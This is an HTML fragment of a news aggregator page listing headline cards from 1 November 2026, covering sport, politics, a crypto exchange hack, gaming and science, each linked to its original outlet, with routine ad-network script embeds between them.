-    <div class="article-body"><img src="https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYU3hEL1b1D3C4mpQuhQ4d7NHA6ahFlxQoCzoj57z1LNoJ3ybCEtAPsd+we9Czeyne2o5v1WamPcOlMZSqd2yXhfhk47EGvH69oFFHSh%2FS4Z922gTpc0nbRLIQkpsAQVmi1T7UE6Rm+U5JOQHG2S6O2lqhn497mzOBH8K3UWW2MEL897zyN3j1QBEj80hcQ91Ei26Ks2dXIA9F261q0Kl0UfoNwJ9TFdIZ%2FQwnLpinLe94UtmMvJE%2FEgv3U5F+1qFWrO6LqwL75VkX5hc8c0+WdIiiPUZPWt6HIwp9rEELX4OqeghKHEZABxSlSJFwuTc7yZBAIVQBxMsMO9XB0YmuD7qj5VpUbMSmqU0cQjvqvLv4DukkLo4znjtFkEWv36GgMsDBDQnKd8LmXBruQvdXpiJ7E8k5ExchD5gqNMWG9hwaJQen%2FCqV+UQCF+vzc6Ujw==?resolution=1240x700" alt="Black Caps player ratings: Tell us how they performed against India" loading="lazy">We want your take on how each of Black Caps performed against India in their fifth T20 match.</div>
-</article>
-<article class="article-card" id="artikel-562">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Seifert finds form as Black Caps finish T20I series with back-to-back wins", "image": ["https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYRt5RYXcP6v2hp%2F+OQWQK+Vrdnc5qGnWIVdkJxk6Pw8PlFxGjttPkeno9OO1krD6Tk5Nhypk5G375zwNre4xx772HX72ED0cP3DJOCROXxcWAMajcxv%2FfQzAtJvKFzCy9Oc+8OcdT7+P2y7jMY6eTP40gajb1F7LoCBdX5D0SZRkI%2F29EqzpCL32CFi1F41l6iw78Gaan9QLlnU9HiF0AED%2FvWO30+t8mcNdwEYU9+5+SR4g7yVd+Drg9L5lUQ96QtqZ3qpxOv1qMPdY17uh3esRXOKj5k6S6jPjzepouxsqqZalR53WR0tPUaLkWBnQ35mWzZHiptid8exeVf7qRptjYDoZ06QlCCqU6vvJX++TZZX8myEL8YjhYX3r7lwJLKnzIVTrHdgydRFQARmttJS%2F1YNBlPcF5CuDTiuT4GOX3BdutXKJL8ZSRVpvbylW3goDMc1FA+RrocezHynkepw=?resolution=1240x700"], "datePublished": "2026-11-01T10:37:06Z", "dateModified": "2026-11-01T10:37:06Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-562"}</script>
-    <h2>Seifert finds form as Black Caps finish T20I series with back-to-back wins</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.stuff.co.nz/sport/361051832/tim-seifert-finds-form-black-caps-finish-t20i-series-against-india-back-back-wins" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://www.stuff.co.nz/media/images/9Tzi8ywRz924XE3uHaD6DZ3Ef+IdbOiYlvIROR5vlqUeRrexTocZGobKRJ9od%2Fgnk3B%2FCeKTmTAsIjj6Q0YaYRt5RYXcP6v2hp%2F+OQWQK+Vrdnc5qGnWIVdkJxk6Pw8PlFxGjttPkeno9OO1krD6Tk5Nhypk5G375zwNre4xx772HX72ED0cP3DJOCROXxcWAMajcxv%2FfQzAtJvKFzCy9Oc+8OcdT7+P2y7jMY6eTP40gajb1F7LoCBdX5D0SZRkI%2F29EqzpCL32CFi1F41l6iw78Gaan9QLlnU9HiF0AED%2FvWO30+t8mcNdwEYU9+5+SR4g7yVd+Drg9L5lUQ96QtqZ3qpxOv1qMPdY17uh3esRXOKj5k6S6jPjzepouxsqqZalR53WR0tPUaLkWBnQ35mWzZHiptid8exeVf7qRptjYDoZ06QlCCqU6vvJX++TZZX8myEL8YjhYX3r7lwJLKnzIVTrHdgydRFQARmttJS%2F1YNBlPcF5CuDTiuT4GOX3BdutXKJL8ZSRVpvbylW3goDMc1FA+RrocezHynkepw=?resolution=1240x700" alt="Seifert finds form as Black Caps finish T20I series with back-to-back wins" loading="lazy">The series finished with India 3-2 winners and New Zealand ruing two close defeats in the first two matches in Christchurch.</div>
-</article>
-<article class="article-card" id="artikel-2045">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Binance opens crypto withdrawals in phases starting with bitcoin following $6.3 billion hack", "image": ["https://cdn.sanity.io/images/s3y3vcno/production/181172871eb545726569b01a45cfc5c8c4ec911f-5472x3078.jpg?fm=jpg&w=800&h=450&crop=focalpoint&fit=clip"], "datePublished": "2026-11-01T10:35:42+00:00", "dateModified": "2026-11-01T10:35:42+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2045"}</script>
-    <h2>Binance opens crypto withdrawals in phases starting with bitcoin following $6.3 billion hack</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.coindesk.com/markets/2026/11/01/binance-opens-crypto-withdrawals-in-phases-starting-with-bitcoin-following-usd6-3-billion-hack" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://cdn.sanity.io/images/s3y3vcno/production/181172871eb545726569b01a45cfc5c8c4ec911f-5472x3078.jpg?fm=jpg&amp;w=800&amp;h=450&amp;crop=focalpoint&amp;fit=clip" alt="Binance opens crypto withdrawals in phases starting with bitcoin following $6.3 billion hack" loading="lazy"></div>
-</article>
-<article class="article-card" id="artikel-3592">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "AOC-backed Alaska Senate hopeful Mary Peltola accused of using n-word", "image": [], "datePublished": "2026-11-01T10:31:20Z", "dateModified": "2026-11-01T10:31:20Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3592"}</script>
-    <h2>AOC-backed Alaska Senate hopeful Mary Peltola accused of using n-word</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://nypost.com/2026/11/01/us-news/aoc-backed-alaska-senate-hopeful-mary-peltola-accused-of-using-n-word/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Mary Peltola — the Alaska Democratic Senate hopeful famously championed by "Squad" Rep. Alexandria Ocasio-Cortez — is fighting allegations by former staffers she used the n-word in a 2024 incident.</div>
-</article>
-<article class="article-card" id="artikel-3593">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "College basketball tips off with Notre Dame vs. Villanova in Rome—How to watch", "image": [], "datePublished": "2026-11-01T10:30:00Z", "dateModified": "2026-11-01T10:30:00Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3593"}</script>
-    <h2>College basketball tips off with Notre Dame vs. Villanova in Rome—How to watch</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://nypost.com/2026/11/01/sports/college-basketball-tips-off-with-notre-dame-vs-villanova-in-rome-how-to-watch/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">The 2026-27 college basketball season is tipping off in the Eternal City.</div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-3594">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Endangered weasel once thought to be extinct is spotted in South Dakota&#8217;s Badlands National Park", "image": [], "datePublished": "2026-11-01T10:25:05Z", "dateModified": "2026-11-01T10:25:05Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3594"}</script>
-    <h2>Endangered weasel once thought to be extinct is spotted in South Dakota&amp;#8217;s Badlands National Park</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://nypost.com/2026/11/01/lifestyle/south-dakotas-badlands-national-park-is-home-to-endangered-weasel-once-thought-extinct/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Scientists estimate there are 120 black-footed ferrets living in Badlands National Park.</div>
-</article>
-<article class="article-card" id="artikel-1606">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Qatar LNG carrier struck by ‘unidentified objects’ in Gulf", "image": [], "datePublished": "2026-11-01T10:21:48+00:00", "dateModified": "2026-11-01T10:21:48+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1606"}</script>
-    <h2>Qatar LNG carrier struck by ‘unidentified objects’ in Gulf</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.aljazeera.com/news/2026/11/1/qatar-lng-carrier-struck-by-unidentified-objects-in-gulf?traffic_source=rss" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Qatar Gas Transport Company says no injuries or environmental damage.</div>
-</article>
-<article class="article-card" id="artikel-3816">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "New York City Marathon Livestream: How to Watch the 2026 Race Online for Free", "image": [], "datePublished": "2026-11-01T10:14:00Z", "dateModified": "2026-11-01T10:14:00Z", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3816"}</script>
-    <h2>New York City Marathon Livestream: How to Watch the 2026 Race Online for Free</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.rollingstone.com/tv-movies/tv-movie-news/where-to-stream-new-york-city-marathon-online-free-2026-1235650494/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Here’s how to get a free livestream of the 2026 NYC Marathon from anywhere in the country</div>
-</article>
-<article class="article-card" id="artikel-140">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Indian opposition unites to demand Modi electoral chief’s resignation", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/84858078-8b23-475f-b1d8-7638e7012cfb_2ab7e6d9.jpg?itok=9xBSGsr_&v=1793527984"], "datePublished": "2026-11-01T10:13:07+00:00", "dateModified": "2026-11-01T10:13:07+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-140"}</script>
-    <h2>Indian opposition unites to demand Modi electoral chief’s resignation</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.scmp.com/news/asia/south-asia/article/3372886/indian-opposition-unites-demand-modi-electoral-chiefs-resignation" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/84858078-8b23-475f-b1d8-7638e7012cfb_2ab7e6d9.jpg?itok=9xBSGsr_&amp;v=1793527984" alt="Indian opposition unites to demand Modi electoral chief’s resignation" loading="lazy">Thousands protested in Delhi on Sunday to demand the resignation of India’s election chief over a revision of voter lists, the latest in more than a month of ‌opposition demonstrations challenging Prime Minister Narendra Modi.
-Led by Congress party chief Rahul Gandhi, Sunday’s protesters say the controversial revision benefits Modi’s Hindu nationalist Bharatiya Janata Party.
-Analysts say the protests and growing support for the opposition form the worst crisis for Modi since he came to power in...</div>
-</article>
-<article class="article-card" id="artikel-1607">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Jamaal Bowman: ‘If I had kept my mouth shut, I’d be in Congress’", "image": [], "datePublished": "2026-11-01T10:10:30+00:00", "dateModified": "2026-11-01T10:10:30+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1607"}</script>
-    <h2>Jamaal Bowman: ‘If I had kept my mouth shut, I’d be in Congress’</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.aljazeera.com/video/upfront/2026/11/1/jamaal-bowman-if-i-had-kept-my-mouth-shut-id-be-in-congress?traffic_source=rss" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Marc Lamont Hill speaks to Jamaal Bowman about the growing battle between progressives and the Democratic establishment.</div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-1608">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Yemeni government forces seize strategic positions in al-Jawf", "image": [], "datePublished": "2026-11-01T10:08:55+00:00", "dateModified": "2026-11-01T10:08:55+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1608"}</script>
-    <h2>Yemeni government forces seize strategic positions in al-Jawf</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.aljazeera.com/news/2026/11/1/yemeni-government-forces-seize-strategic-positions-in-al-jawf?traffic_source=rss" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">Weapons and ammunition depots are seized after a counteroffensive.</div>
-</article>
-<article class="article-card" id="artikel-1609">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "From railway tragedy to gov’t change: Serbia’s two-year fight for justice", "image": [], "datePublished": "2026-11-01T10:04:22+00:00", "dateModified": "2026-11-01T10:04:22+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1609"}</script>
-    <h2>From railway tragedy to gov’t change: Serbia’s two-year fight for justice</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.aljazeera.com/news/2026/11/1/from-railway-tragedy-to-govt-change-serbias-two-year-fight-for-justice?traffic_source=rss" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body">A timeline of events since the deadly train station collapse in Novi Sad, which led to a change of government in Serbia.</div>
-</article>
-<article class="article-card" id="artikel-2798">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Pikmin 4 Nintendo Switch 2 Edition launches 12th November and a demo is out tomorrow", "image": ["https://assetsio.gnwcdn.com/Screenshot-2026-10-31-at-21.28.07.png?width=690&quality=85&format=jpg&auto=webp"], "datePublished": "2026-11-01T10:04:13+00:00", "dateModified": "2026-11-01T10:04:13+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2798"}</script>
-    <h2>Pikmin 4 Nintendo Switch 2 Edition launches 12th November and a demo is out tomorrow</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.eurogamer.net/pikmin-4-switch-2-edition-release-date-demo" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://assetsio.gnwcdn.com/Screenshot-2026-10-31-at-21.28.07.png?width=690&amp;quality=85&amp;format=jpg&amp;auto=webp" alt="Pikmin 4 Nintendo Switch 2 Edition launches 12th November and a demo is out tomorrow" loading="lazy"><img src="https://assetsio.gnwcdn.com/Screenshot-2026-10-31-at-21.28.07.png?width=690&amp;quality=85&amp;format=jpg&amp;auto=webp"> <p><a href="https://www.eurogamer.net/games/pikmin-4">Pikmin 4</a> <a href="https://www.eurogamer.net/platforms/switch-2">Nintendo Switch 2</a> Edition will launch on 12th November, bundled with a new mode called Dandori Academy.</p> <p><a href="https://www.eurogamer.net/pikmin-4-switch-2-edition-release-date-demo">Read more</a></p></div>
-</article>
-<article class="article-card" id="artikel-142">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "At 97, China’s first female conductor still performs in public, wowing audiences", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/568cfa6e-0fdc-418a-93c3-9b96096d8a65_7d0fad89.jpg?itok=Q5Ais7Qe&v=1793525304"], "datePublished": "2026-11-01T10:00:17+00:00", "dateModified": "2026-11-01T10:00:17+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-142"}</script>
-    <h2>At 97, China’s first female conductor still performs in public, wowing audiences</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.scmp.com/news/people-culture/china-personalities/article/3372882/97-chinas-first-female-conductor-still-performs-public-wowing-audiences" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/568cfa6e-0fdc-418a-93c3-9b96096d8a65_7d0fad89.jpg?itok=Q5Ais7Qe&amp;v=1793525304" alt="At 97, China’s first female conductor still performs in public, wowing audiences" loading="lazy">China’s first female conductor, Zheng Xiaoying, is 97 years old, but she continues to give outstanding performances to audiences.
-In August, the nonagenarian conducted the Chinese-language version of the opera Carmen in Xiamen, in southeastern China’s Fujian province, where she lives. Tickets for the performance were like gold dust, and audiences marvelled, as always, at her elegant, expressive conducting.
-Zheng has led a remarkable life. Born in Shanghai in 1929, she began studying piano at age...</div>
-</article>
-<article class="article-card" id="artikel-143">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "From rifles to radar: China upgrades its African arms trade as Russia and the West retreat", "image": ["https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/e3b2784a-3ab1-4de1-aa31-592945321a46_6aaf9cd8.jpg?itok=0zunrE03&v=1793514593"], "datePublished": "2026-11-01T10:00:11+00:00", "dateModified": "2026-11-01T10:00:11+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-143"}</script>
-    <h2>From rifles to radar: China upgrades its African arms trade as Russia and the West retreat</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.scmp.com/news/china/diplomacy/article/3372870/rifles-radar-china-upgrades-its-african-arms-trade-russia-and-west-retreat" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://cdn.i-scmp.com/sites/default/files/styles/1280x720/public/d8/images/canvas/2026/11/01/e3b2784a-3ab1-4de1-aa31-592945321a46_6aaf9cd8.jpg?itok=0zunrE03&amp;v=1793514593" alt="From rifles to radar: China upgrades its African arms trade as Russia and the West retreat" loading="lazy">For decades, China has supplied African militaries with small arms and land-based equipment such as armoured vehicles, trucks and artillery.
-Now, it is selling them more specialised weapons, including armed drones and electronic warfare systems.
-Analysts noted that China’s African arms sales were shifting qualitatively to air-defence systems, armed drones and electronic warfare gear once dominated by Russia and the West.
-In April, four vehicles identified by defence analysis group Janes as...</div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-2251">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "‘It’s about the opportunities’: Trade minister insists EU summit will bear fruit", "image": ["https://www.ctvnews.ca/resizer/v2/ZRX3DRNXOTDX5BD4SUJKWO2VGA.jpg?auth=4d947626424f9401bd428348dee76d0d1575fddba3c5c8b064176e3ceade60dc&smart=true&width=1400&height=933"], "datePublished": "2026-11-01T10:00:00-04:00", "dateModified": "2026-11-01T10:00:00-04:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2251"}</script>
-    <h2>‘It’s about the opportunities’: Trade minister insists EU summit will bear fruit</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.ctvnews.ca/politics/article/its-about-the-opportunities-trade-minister-insists-eu-summit-will-bear-fruit/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://www.ctvnews.ca/resizer/v2/ZRX3DRNXOTDX5BD4SUJKWO2VGA.jpg?auth=4d947626424f9401bd428348dee76d0d1575fddba3c5c8b064176e3ceade60dc&amp;smart=true&amp;width=1400&amp;height=933" alt="‘It’s about the opportunities’: Trade minister insists EU summit will bear fruit" loading="lazy">Minister of International Trade Maninder Sidhu rises during question period in the House of Commons on Parliament Hill in Ottawa on Friday, Oct. 9, 2026. THE CANADIAN PRESS/Justin Tang</div>
-</article>
-<article class="article-card" id="artikel-1231">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "A Newly Discovered Trail of Cosmic Debris Illustrates How the End of the Solar System Could Look", "image": ["https://media.wired.com/photos/6ae377e1cbf5d13e90635178/master/pass/eso2613a.jpg"], "datePublished": "2026-11-01T10:00:00+00:00", "dateModified": "2026-11-01T10:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1231"}</script>
-    <h2>A Newly Discovered Trail of Cosmic Debris Illustrates How the End of the Solar System Could Look</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.wired.com/story/a-newly-discovered-trail-of-cosmic-debris-illustrates-what-the-end-of-the-solar-system-could-look-like/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://media.wired.com/photos/6ae377e1cbf5d13e90635178/master/pass/eso2613a.jpg" alt="A Newly Discovered Trail of Cosmic Debris Illustrates How the End of the Solar System Could Look" loading="lazy">A dying star 1,600 light-years from Earth is surrounded by two rings of gas and dust that astronomers believe are the remnants of the planetary bodies it once hosted.</div>
-</article>
-<article class="article-card" id="artikel-1257">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Best Chromebooks and Googlebooks (2026): Laptops With a Google Touch", "image": ["https://media.wired.com/photos/6ae4f7cdc47e8737f5c92342/master/pass/Update%20Best%20Chromebooks%20102026%20top%20art%20SOURCE%20Amazon-Best%20Buy.jpg"], "datePublished": "2026-11-01T10:00:00+00:00", "dateModified": "2026-11-01T10:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-1257"}</script>
-    <h2>Best Chromebooks and Googlebooks (2026): Laptops With a Google Touch</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.wired.com/story/best-chromebooks/" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://media.wired.com/photos/6ae4f7cdc47e8737f5c92342/master/pass/Update%20Best%20Chromebooks%20102026%20top%20art%20SOURCE%20Amazon-Best%20Buy.jpg" alt="Best Chromebooks and Googlebooks (2026): Laptops With a Google Touch" loading="lazy">While Google is heralding a new series of laptops called Googlebooks, Chromebooks are sticking around—for now. These are the ones to consider.</div>
-</article>
-<article class="article-card" id="artikel-2778">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Dylan Efron, Carl Radke & More Celebs to Root for in the NYC Marathon", "image": ["https://akns-images.eonline.com/eol_images/Entire_Site/20221122/rs_1200x1200-221222141604-1200-amy-andrew-shue-marathon-GettyImages-1185286081.jpg"], "datePublished": "2026-11-01T10:00:00+00:00", "dateModified": "2026-11-01T10:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2778"}</script>
-    <h2>Dylan Efron, Carl Radke &amp; More Celebs to Root for in the NYC Marathon</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.eonline.com/news/1437596/which-celebrities-are-running-the-new-york-city-marathon-more-races?cmpid=rss-syndicate-genericrss-us-top_stories" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://akns-images.eonline.com/eol_images/Entire_Site/20221122/rs_1200x1200-221222141604-1200-amy-andrew-shue-marathon-GettyImages-1185286081.jpg" alt="Dylan Efron, Carl Radke &amp; More Celebs to Root for in the NYC Marathon" loading="lazy"><img alt="Amy Robach, Andrew Shue, 2019 TCS New York City Marathon" src="https://akns-images.eonline.com/eol_images/Entire_Site/20221122/rs_1200x1200-221222141604-1200-amy-andrew-shue-marathon-GettyImages-1185286081.jpg?fit=around|660:660">Count Traitors&#x27; Dylan Efron, Summer House&#x27;s Carl Radke, Dance Moms alum Chloé Lukasiak and actress Jennifer Connelly among those ready to run this town. 
-As in, lace up their sneaks and sweat...<br></div>
-</article>
-<article class="article-card" id="artikel-3478">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Feature: Box Art Brawl - Duel: Revenge Of The 'Gator", "image": ["https://images.nintendolife.com/fc374016d2c18/large.jpg"], "datePublished": "2026-11-01T10:00:00+00:00", "dateModified": "2026-11-01T10:00:00+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-3478"}</script>
-    <h2>Feature: Box Art Brawl - Duel: Revenge Of The &#x27;Gator</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.nintendolife.com/features/box-art-brawl-duel-revenge-of-the-gator" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
-    <div class="article-body"><img src="https://images.nintendolife.com/fc374016d2c18/large.jpg" alt="Feature: Box Art Brawl - Duel: Revenge Of The &#x27;Gator" loading="lazy"><p><strong>See ya later.</strong></p><p>It's time for another edition of <a href="https://www.nintendolife.com/tags/box-art-brawl">Box Art Brawl</a>, can you believe it!</p><p><a href="https://www.nintendolife.com/features/box-art-brawl-duel-avenging-spirit-game-boy">Last week</a>, we took a look at two <em>very different</em> covers for NSO newbie <a href="https://www.nintendolife.com/games/gameboy/avenging_spirit">Avenging Spirit</a> on the Game Boy. The disparate designs did the North American variant no favours, as it wound up with only 30% of the vote, leaving the cuter Japanese and European cover to take the remaining 70%.</p><p>Read the <a href="https://www.nintendolife.com/features/box-art-brawl-duel-revenge-of-the-gator">full article on nintendolife.com</a></p></div>
-</article>
-<div style="text-align:center;margin:20px 0;">
-    <script type="text/javascript">
-        atOptions = {
-            'key' : 'f9e40eb3b3cd05f1038aac7b36b33ad2',
-            'format' : 'iframe',
-            'height' : 90,
-            'width' : 728,
-            'params' : {}
-        };
-    </script>
-    <script type="text/javascript" src="https://upholdbrilliancerecast.com/f9e40eb3b3cd05f1038aac7b36b33ad2/invoke.js"></script>
-</div>
-
-<article class="article-card" id="artikel-2840">
-    <script type="application/ld+json">{"@context": "https://schema.org", "@type": "NewsArticle", "headline": "Senegal hosts first Olympic event on African continent", "image": ["https://s.france24.com/media/display/75a22272-d5da-11f1-80a7-1beafce15fea/w:1024/p:16x9/EN-20261101-101101-101232-CS.jpg"], "datePublished": "2026-11-01T09:58:13+00:00", "dateModified": "2026-11-01T09:58:13+00:00", "mainEntityOfPage": "https://thenewsday112.github.io/pyton/other.html#artikel-2840"}</script>
-    <h2>Senegal hosts first Olympic event on African continent</h2>
-    <div class="article-meta">
-        📅 Nov 01, 2026 &nbsp;|&nbsp; Category: <strong>Other</strong> &nbsp;|&nbsp;
-        <a href="https://www.france24.com/en/senegal-hosts-first-olympic-event-on-african-continent" target="_blank" rel="nofollow noopener">Read Source &rarr;</a>
-    </div>
